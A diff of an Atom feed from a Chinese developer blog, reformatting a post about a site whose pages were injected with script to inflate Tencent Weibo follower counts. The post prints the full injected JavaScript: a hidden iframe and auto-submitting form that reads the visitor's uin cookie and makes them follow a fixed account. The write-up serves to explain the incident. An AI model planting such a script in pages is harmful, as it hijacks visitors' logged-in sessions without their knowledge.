@@ -4,7 +4,7 @@
   <title><![CDATA[分类：security | 移动开发技术]]></title>
   <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2016-08-03T12:11:11+08:00</updated>
+  <updated>2016-08-03T12:15:21+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -20,7 +20,7 @@
     <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
     <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>
 
-<p>被插入代码截图如下（每个页面都有，应该是框架被修改）</p>
+<p>被插入代码截图如下（每个页面都有，框架被修改）</p>
 
 <p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>
 
@@ -36,22 +36,14 @@
 
 <p>格式化</p>
 
-<p>```javascript
-(function() {
-    window.u = &ldquo;chunxi_lu&rdquo;;
-    window.mm = document.createElement(&ldquo;div&rdquo;);
-    window.mm.innerHTML = &ldquo;<iframe style='display:none' name='mj'></iframe><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'><input type='hidden' value='" + window.u + "' name='u'/><input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/></form>&rdquo;;
+<pre><code class="javascript">(function() {
+    window.u = "chunxi_lu";
+    window.mm = document.createElement("div");
+    window.mm.innerHTML = "&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='" + window.u + "' name='u'/&gt;&lt;input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/&gt;&lt;/form&gt;";
     document.body.appendChild(window.mm);
-    document.getElementById(&ldquo;mi&rdquo;).submit();
-})()</p>
-
-<iframe style='display:none' name='mj'></iframe>
-
-
-<p><form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'>
-    <input type='hidden' value='" + window.u + "' name='u' />
-    <input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin' />
-```</p>
+    document.getElementById("mi").submit();
+})()
+</code></pre>
 
 <p>粉丝数刷到3w+</p>
 
